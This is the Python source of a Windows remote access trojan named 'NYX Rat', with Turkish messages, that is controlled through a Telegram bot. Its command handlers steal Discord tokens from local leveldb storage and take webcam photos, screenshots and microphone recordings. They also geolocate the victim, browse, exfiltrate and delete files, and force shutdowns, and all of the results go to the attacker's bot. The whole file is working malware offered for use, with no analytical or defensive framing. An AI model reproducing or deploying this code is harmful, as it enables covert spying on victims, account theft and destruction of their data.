import os
import requests
import subprocess
import pyautogui
import sounddevice
import telebot
import win32gui
import cv2
import webbrowser
import ctypes
import pyttsx3
import sounddevice as sd
from scipy.io.wavfile import write
import re
import win32api
import win32con




bot = telebot.TeleBot("Token")


class Fonkss():

    def __init__(self):
        self.path = os.getenv('AppData')
        self.path_dc = [self.path + '\\Discord', self.path + '\\discordcanary', self.path + '\\discordptb']
        self.TOKEN = []

    def Location_(self):
        r = requests.get("https://ipinfo.io/").json()
        return r["ip"], r["loc"]

    def Message_Bot(self,title, message):
        win32gui.MessageBox(0,message,title,0)

    def WhoAmi(self):
        return os.getenv('username')

    def WebCamFonks(self):
        path = os.getenv("APPDATA")+os.sep+"v.png"
        camera = cv2.VideoCapture(0)
        return_value, image = camera.read()
        cv2.imwrite(path, image)
        camera.release()
        cv2.destroyAllWindows()
        return path

    def OpenUrl(self, url):
        webbrowser.open(url)

    def OpenCd(self):
        ctypes.windll.WINMM.mciSendStringW('set cdaudio door open', None, 0, None)

    def Speak_(self,text):
        engine = pyttsx3.init()
        engine.say(text=text)
        engine.runAndWait()


    def Chwall_(self,url):
        path = os.getenv('AppData')+os.sep+"f.png"
        r = requests.get(url=url).content
        with open(path,"wb") as f:
            f.write(r)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)


    def Pwd_(self):
        return os.getcwd()

    def Dir_(self):
        return os.listdir()

    def Cd_(self,path):
        return os.chdir(path=path)

    def Token_find(self,Directory):


        Directory += '\\Local Storage\\leveldb'

        for file in os.listdir(Directory):
            if not file.endswith('.log') and not file.endswith('.ldb'):
                continue
            for lin in open(f'{Directory}\\{file}', errors='ignore').readlines():
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    for _ in re.findall(regex, lin.strip()):
                        self.TOKEN.append(_)

        return self.TOKEN

    def DC_tOKEN(self):

        for _ in self.path_dc:

            if os.path.exists(_):
                Tokens = self.Token_find(_)

            if len(Tokens) > 0:
                for Token in Tokens:
                    return Token
            else:
                return ("Token Bulunamadı")


fonks = Fonkss()

@bot.message_handler(commands=['start'])
def handle_command(message):
    bot.reply_to(message,"✮ NYX Rat Kullanıma Hazır ✮ "
                         f"\nMerhaba {message.from_user.first_name} ! "
                         f"\n\nKomutlar : /Commands",
                 )

@bot.message_handler(commands=["location"])
def Location(message):
    bot.send_message(message.from_user.id, f"İp : {fonks.Location_()[0]}")
    bot.send_location(message.from_user.id,(fonks.Location_()[1].split(",")[0]),(fonks.Location_()[1].split(",")[1]))


@bot.message_handler(commands=["MessageBox"])
def Message_Box_(message):
    mes = str(message.text)
    message_ = mes[mes.find("x")+1:].split(",")
    try:
        fonks.Message_Bot(message_[0], message_[1])
        bot.reply_to(message, "Pencere Başarıyla Açıldı ve Kullanıcı tarafından kapatıldı")
    except IndexError:
        bot.reply_to(message,"Hata Yanlış değer girildi, Lütfen tekrar deneyin ! ")



@bot.message_handler(commands=["Systeminfo"])
def SystemInfo_(message):
    Sysinfo = subprocess.check_output("systeminfo", shell=True)
    bot.reply_to(message, str(Sysinfo))


@bot.message_handler(commands=["Screenshot"])
def ScreenShot_(message):
    screen = pyautogui.screenshot()
    screen.save(os.getenv("APPDATA")+os.sep+"k.png")
    bot.send_photo(message.from_user.id, photo=open(os.getenv("APPDATA")+os.sep+'k.png', "rb"))
    os.remove(os.getenv("APPDATA")+os.sep+"k.png")

@bot.message_handler(commands=["whoami"])
def Whoami_(message):
    bot.reply_to(message,fonks.WhoAmi())


@bot.message_handler(commands=["Webcam"])
def WebCam(message):
    bot.send_photo(message.from_user.id, photo=open(fonks.WebCamFonks(),"rb"))


@bot.message_handler(commands=["OpenUrl"])
def OpenUrl_(message):
    try:
        message_ = str(message.text).split(" ")[-1]
        bot.reply_to(message, "Url Açıldı")
        fonks.OpenUrl(message_)

    except:
        ...
@bot.message_handler(commands=["OpenCdRom"])
def OpenCdRom_(message):
    bot.reply_to(message,"Cd rom açıldı")
    fonks.OpenCd()

@bot.message_handler(commands=["Speak"])
def Speak_(message):
    try:
        fonks.Speak_(str(message.text).split(",")[1])
        bot.reply_to(message, "Mesaj okundu")
    except:
        ...
@bot.message_handler(commands=["CHWAL"])
def CHWAL_(message):
    try:
        fonks.Chwall_(str(message.text).split(",")[1])
        bot.reply_to(message,"Arka plan resmi değişti")
    except:
        ...

@bot.message_handler(commands=["pwd"])
def Pwd_(message):
    bot.reply_to(message, fonks.Pwd_())


@bot.message_handler(commands=["dir"])
def Dir_(message):
    bot.reply_to(message, str(fonks.Dir_()))

@bot.message_handler(commands=["cd"])
def Cd_(message):
    try:

        fonks.Cd_(str(message.text[message.text.find(" "):]).strip())

        bot.reply_to(message, f"Şimdiki dizin : {fonks.Pwd_()}")
    except FileNotFoundError:
        bot.reply_to(message,"Dizin Bulunamadı")
        print(str(message.text[message.text.find(" "):]).strip())

@bot.message_handler(commands=["Download"])
def Download_(message):
    try:
        file = (str(message.text).split(" ")[-1])
        doc = open(f"{file}","rb")
        bot.send_document(message.chat.id , doc)
    except:
        ...


@bot.message_handler(commands=["Delete"])
def Delete_(message):
    try:
        os.remove(str(message.text).split(" ")[-1])
        bot.reply_to(message,"Dosya silindi ")
    except FileNotFoundError:
        bot.reply_to(message,"Dosya ismi girilmedi ")



@bot.message_handler(commands=["shutdown"])
def Shutdown(message):
    bot.reply_to(message,"Bilgisayar Kapanıyor")
    subprocess.call('shutdown -s -f -t 3', shell=True)

@bot.message_handler(commands=["Restart"])
def Restart_(message):
    bot.reply_to(message, "Bilgisayar yeniden başlatılacak")
    subprocess.call('shutdown -r /t 0 /f', shell=True)


@bot.message_handler(commands=["Audio"])
def Audio_(message):
    try:
        frekans = 44100
        sure = int(str(message.text).split(" ")[-1])
        kaydet = sd.rec(int(sure * frekans), samplerate=frekans, channels=2)
        bot.reply_to(message, "Mikrofun kayıt ediliyor")
        sd.wait()
        write("system.wav", frekans, kaydet)
        voice = open('system.wav', 'rb')
        bot.send_voice(message.chat.id, voice)
    except ValueError:
        bot.reply_to(message,"Hata ! Tekrar deneyin ...")
    except sounddevice.PortAudioError:
        bot.reply_to(message, "Mikrofona erişim sağlanamadı ...")



@bot.message_handler(commands=["DCToken"])
def DCToken_(message):
    try:
        bot.reply_to(message, f"Discord Token : \n\n{fonks.DC_tOKEN()}")
        print(fonks.DC_tOKEN())

    except :
        ...


@bot.message_handler(commands=["VoiPow"])
def VoiPow_(message):
    try:
        msg = str(message.text).split(" ")[-1]
        bot.reply_to(message, "Ses yükseldi.")
        for i in range(int(msg)):
            win32api.keybd_event(win32con.VK_VOLUME_UP, 0)

    except:
        ...


@bot.message_handler(commands=["Commands"])
def Command_List(message):
    bot.reply_to(message,"\n🔴 Komutlar 🔴"
                         "\n\n/Screenshot : Ekran Görüntüsü alır."
                         "\n\n/location : Konum bilgilerini gösterir."
                         "\n\n/MessageBox : Ekranda mesaj kutusu Gösterir. exp(/MessageBox title , message )."
                         "\n\n/Systeminfo : Sistem özelliklerini gösterir. "
                         "\n\n/Webcam : Kamera'dan resim çeker."
                         "\n\n/whoami : Kullanıcı adını gösterir."
                         "\n\n/Audio : Verilen saniye kadar mikrofundan ses kayıt eder exp(/Audio 5)"
                         "\n\n/OpenUrl : Url adresini tarayıcıda açar. exp(/OpenUrl https://test.com/)"
                         "\n\n/OpenCdRom : Cd rom'u açar"
                         "\n\n/shutdown : Bilgisayarı kapatır."
                         "\n\n/Speak : Verilen mesaji sesli bir şekilde okur exp(/Speak , message)"
                         "\n\n/CHWAL : Bilgisayarın arka plan resmini değiştirir exp(/CHWAL , url)"
                         "\n\n/cd : Dosyalar arasında gezinme exp(/cd Desktop)"
                         "\n\n/dir : Klasörde'ki dosyaları gösterir"
                         "\n\n/Download : Belirtilen dosyayı indirir exp(/Download filename.txt)"
                         "\n\n/pwd : Geçerli olan dizini gösterir"
                         "\n\n/Delete : Belirtilen dosyayı siler exp(/Delete filename.txt)"
                         "\n\n/Restart : Bilgisayarı yeniden başlatır"
                         "\n\n/DCToken : Kullanıcının discord tokenini gönderir"
                         "\n\n/VoiPow :Bilgisayarın sesini yükseltir exp(/VoiPow 3)"
                )


bot.polling()


